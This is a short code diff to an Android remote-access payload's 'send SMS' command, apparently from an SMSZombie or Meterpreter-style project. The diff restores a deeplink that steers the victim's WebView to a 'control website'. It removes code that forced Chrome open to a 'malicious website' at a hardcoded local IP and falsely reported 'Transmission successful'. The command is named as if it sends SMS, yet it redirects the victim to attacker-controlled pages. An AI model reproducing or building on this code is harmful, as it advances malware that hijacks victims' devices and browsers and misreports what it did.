@@ -59,7 +59,6 @@ public class android_send_sms implements Command {
         * https://developer.android.com/guide/components/activities/background-starts
         */
 
-        /*
         // Starts intent with deeplink to navigate SMSZombie's WebView to control website
         try {
             Intent intent = new Intent("android.intent.action.VIEW",
@@ -72,21 +71,6 @@ public class android_send_sms implements Command {
         } catch (ActivityNotFoundException e) {
             resultSent = e.getMessage();
             resultDelivered = e.getMessage();
-        }
-        */
-
-        // Issue Chrome intent to malicious website
-        String urlString = "http://192.168.1.134:1312";
-        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        intent.setPackage("com.android.chrome");
-        try {
-            context.startActivity(intent);
-            resultSent = "Transmission successful";
-            resultDelivered = "Transmission successful";
-        } catch (ActivityNotFoundException ignored) {
-          resultSent = "Chrome app not installed";
-          resultDelivered = "Chrome app not installed";
         }
 
         response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
